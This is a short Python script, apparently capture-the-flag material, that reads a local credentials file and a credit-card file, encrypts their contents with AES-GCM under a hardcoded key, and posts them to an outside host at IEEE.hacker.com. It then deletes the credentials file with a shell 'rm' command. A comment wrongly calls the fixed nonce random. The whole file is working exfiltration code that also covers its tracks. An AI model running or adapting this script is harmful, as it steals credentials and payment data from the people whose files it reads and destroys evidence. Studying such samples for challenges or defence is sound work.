from Cryptodome.Cipher import AES
import base64
from requests import post
from os import system


# Generate a 32-byte key (AES-256)
encryption_key = b'\xf6\x9b\xe0sd\xfdVJ\xed\x17\xea\x15t\x8c\x86\x03T>\xc74\x87/E\xec\xbd\x1e\xe3t\xb3\xb1|\xfa'

def encrypt(plaintext):
    """Encrypt data with AES-256-GCM."""
    nonce = b'IeJ{\xdc\xb0\xd4<pD\x07M'  # Generate a random nonce (12 bytes)
    cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
    return base64.b64encode(nonce + ciphertext + tag).decode()

with open("credentials.txt","r") as credentials_file:
    username, password = credentials_file.readlines()
    post("http://IEEE.hacker.com/last_challenge/H1dden_lol/login", data={"username": encrypt(username), "password": encrypt(password)})
    system("rm credentials.txt")


# data exfiltration
with open("credit_cards.txt", "r") as f:
    data = f.read()
    post("http://IEEE.hacker.com/last_challenge/H1dden_lol/Data_Exfiltration", data={"data": encrypt(data)})